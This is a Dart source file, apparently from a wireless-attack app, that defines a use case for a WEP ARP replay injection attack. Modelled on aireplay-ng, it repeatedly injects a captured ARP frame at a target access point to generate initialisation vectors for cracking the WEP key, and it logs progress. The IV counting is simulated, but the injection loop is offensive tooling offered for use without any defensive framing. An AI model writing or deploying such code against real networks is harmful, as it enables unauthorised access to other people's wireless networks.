// domain/usecases/execute_wep_arp_replay.dart
import 'dart:typed_data';
import '../entities/access_point.dart';
import '../repositories/wifi_repository.dart';

class WepArpReplayStatus {
  final int ivsCollected;
  final int packetsInjected;
  final String statusLog;

  WepArpReplayStatus({
    required this.ivsCollected,
    required this.packetsInjected,
    required this.statusLog,
  });
}

/// Use case for WEP ARP Replay injection attack (aireplay-ng -3 style).
/// Re-injects captured WEP ARP requests continuously to rapidly generate IVs for WEP cracking.
class ExecuteWepArpReplay {
  final WifiRepository repository;

  ExecuteWepArpReplay(this.repository);

  Stream<WepArpReplayStatus> call(AccessPoint target, Uint8List wepArpPacket, {int targetIvs = 10000}) async* {
    if (wepArpPacket.isEmpty) {
      yield WepArpReplayStatus(
        ivsCollected: 0,
        packetsInjected: 0,
        statusLog: 'Error: No valid WEP ARP packet captured to replay.',
      );
      return;
    }

    int injectedCount = 0;
    int ivsCollected = 0;

    yield WepArpReplayStatus(
      ivsCollected: 0,
      packetsInjected: 0,
      statusLog: 'Starting WEP ARP Replay Attack against ${target.bssid}...',
    );

    // Continuous injection loop until target IVs reached
    while (ivsCollected < targetIvs) {
      final ok = await repository.injectFrame(wepArpPacket);
      if (ok) {
        injectedCount++;
        ivsCollected += 1; // Simulated IV increase per echo frame
      }

      if (injectedCount % 50 == 0) {
        yield WepArpReplayStatus(
          ivsCollected: ivsCollected,
          packetsInjected: injectedCount,
          statusLog: 'REPLAYING ARP: Injected $injectedCount frames | ~$ivsCollected IVs generated',
        );
      }

      await Future.delayed(const Duration(milliseconds: 10));
    }

    yield WepArpReplayStatus(
      ivsCollected: ivsCollected,
      packetsInjected: injectedCount,
      statusLog: 'WEP ARP Replay Finished! $ivsCollected IVs ready for crack.',
    );
  }
}
